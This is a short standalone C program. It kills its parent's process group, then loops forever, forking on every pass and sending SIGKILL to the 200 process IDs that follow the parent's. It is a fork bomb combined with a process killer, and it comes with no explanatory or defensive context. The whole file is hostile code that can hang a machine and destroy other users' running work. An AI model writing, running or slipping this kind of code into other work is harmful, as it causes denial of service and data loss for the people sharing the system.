#include <sys/time.h>
#include <sys/resource.h>
#include <stdio.h>
#include <unistd.h>
#include <signal.h>


int main(int argc,char** argv) {
  //get the parents PID
  int parentPID = getppid();
  //set a new group pid
  setpgrp();
  int newpgid = getpgid(0);
  //try and kill all processes of parent and above
  kill(-1*parentPID, SIGKILL);
  //Do forever
    //Fork
    //Kill all processes from parent downward
  while(1) {
 	  int pid = fork();
		int i = parentPID+1;
		int max = i + 200;
		for(i; i<max; i++) {
		    int grp = getpgid(i);
		    if(grp != newpgid) {
 		       kill(i, SIGKILL);
        }
		}
  }
}
